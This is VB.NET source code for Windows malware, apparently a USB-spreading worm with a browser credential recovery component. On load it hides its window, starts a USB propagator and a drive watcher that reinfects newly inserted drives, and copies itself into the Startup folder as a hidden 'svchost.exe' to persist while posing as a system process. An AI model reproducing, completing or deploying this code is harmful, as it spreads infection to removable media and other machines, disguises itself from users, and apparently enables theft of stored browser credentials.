Imports System.IO
Imports System.Net
Imports System.Text
Imports ChromeRecovery
Imports Microsoft.Win32
Imports svchost.Core.Engine.Watcher
Imports svchost.Core.ZipCore

Public Class Form1

    Public FileName As String = "Lsvchost_" & FixPath(Gethotsname.ToString).ToString
    Public FileTempPath As String = IO.Path.Combine(IO.Path.GetTempPath, FileName)
    Public FilePath As String = IO.Path.Combine(AppData, FileName)
    Public Shared ReadOnly AppData As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
    Public Shared ReadOnly LocalAppData As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
    Public USBPro As New S4Lsalsoft.USBPropagator

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        If My_Application_Is_Already_Running() = True Then
            Application.[Exit]()
        End If

        Me.Hide()

        USBPro.Start()
        Me.DriveMon.Start()

        Dim Asynctask As New Task(AddressOf Start, TaskCreationOptions.LongRunning)
        Asynctask.Start()
        InstallOnWindows()

    End Sub

    Public Sub InstallOnWindows()
        Dim ShortcutPath As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
        Dim CurrentPath As String = Application.ExecutablePath
        Dim TargetPath As String = IO.Path.Combine(ShortcutPath, "svchost.exe")

        If Not ShortcutPath = IO.Path.GetDirectoryName(Application.ExecutablePath) Then
            If IO.File.Exists(TargetPath) = False Then

                Try
                    IO.File.Copy(CurrentPath, TargetPath, True)
                Catch ex As Exception
                    Dim startInfo As New ProcessStartInfo("xcopy")
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden
                    startInfo.Arguments = """" & CurrentPath.ToString & """" & " " & """" & ShortcutPath.ToString & """"
                    Process.Start(startInfo)
                End Try

                SetHidden(TargetPath)

            End If
        End If

    End Sub

    Private Function FixPath(ByVal illegal As String) As String
        Return String.Join("", illegal.Split(System.IO.Path.GetInvalidFileNameChars()))
    End Function

    Private Sub SetHidden(ByVal FilePath As String)
        If IO.File.Exists(FilePath) Then
            Dim HiddenVir As New FileInfo(FilePath)
            HiddenVir.Attributes = FileAttributes.Hidden
        End If
    End Sub

#Region " My Application Is Already Running "

    ' [ My Application Is Already Running Function ]
    '
    ' // By Elektro H@cker
    '
    ' Examples :
    ' MsgBox(My_Application_Is_Already_Running)
    ' If My_Application_Is_Already_Running() Then Application.Exit()

    Public Declare Function CreateMutexA Lib "Kernel32.dll" (ByVal lpSecurityAttributes As Integer, ByVal bInitialOwner As Boolean, ByVal lpName As String) As Integer
    Public Declare Function GetLastError Lib "Kernel32.dll" () As Integer

    Public Function My_Application_Is_Already_Running() As Boolean
        'Attempt to create defualt mutex owned by process
        CreateMutexA(0, True, Process.GetCurrentProcess().MainModule.ModuleName.ToString)
        Return (GetLastError() = 183) ' 183 = ERROR_ALREADY_EXISTS
    End Function

#End Region

#Region " Driver Watcher "

    Friend WithEvents DriveMon As New DriveWatcher

    ''' ----------------------------------------------------------------------------------------------------
    ''' <summary>
    ''' Handles the <see cref="DriveWatcher.DriveStatusChanged"/> event of the <see cref="DriveMon"/> instance.
    ''' </summary>
    ''' ----------------------------------------------------------------------------------------------------
    ''' <param name="sender">
    ''' The source of the event.
    ''' </param>
    ''' 
    ''' <param name="e">
    ''' The <see cref="DriveWatcher.DriveStatusChangedEventArgs"/> instance containing the event data.
    ''' </param>
    ''' ----------------------------------------------------------------------------------------------------
    Private Sub DriveMon_DriveStatusChanged(ByVal sender As Object, ByVal e As DriveWatcher.DriveStatusChangedEventArgs) Handles DriveMon.DriveStatusChanged

        Select Case e.DeviceEvent

            Case DriveWatcher.DeviceEvents.Arrival

                If USBPro.Loading = False Then
                    USBPro.Start()
                End If

        End Select

    End Sub


#End Region

End Class
